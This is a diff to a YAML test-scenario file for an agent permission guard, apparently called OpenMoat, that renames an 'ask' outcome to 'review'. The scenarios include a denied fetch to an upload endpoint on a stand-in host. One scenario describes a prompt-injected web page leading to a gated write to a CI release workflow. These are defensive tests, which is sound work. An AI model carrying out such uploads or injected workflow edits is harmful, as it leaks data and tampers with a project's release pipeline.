@@ -24,7 +24,7 @@
   steps:
     - { mcp: { server: fetch, tool: fetch, args: { url: "https://collector.example.net/upload" } }, expect: deny, rule: default.net }
 
-- id: mcp-unknown-tool-asks
+- id: mcp-unknown-tool-needs-review
   threat: T8
   why: >-
     A tool OpenMoat knows nothing about (a shell-runner server) is not on the safe list, so
@@ -103,7 +103,7 @@
   threat: T8
   why: >-
     A page the agent opened may carry a prompt injection, so the session has read
-    untrusted content and a later write to a CI workflow asks (`session-taint`).
+    untrusted content and a later write to a CI workflow needs review (`session-taint`).
   steps:
     - { mcp: { server: playwright, tool: browser_navigate, args: { url: "https://notes.example.net/setup" } }, expect: defer, rule: default.fetch }
-    - { write: ".github/workflows/release.yml", expect: ask, rule: session-taint }
+    - { write: ".github/workflows/release.yml", expect: review, rule: session-taint }
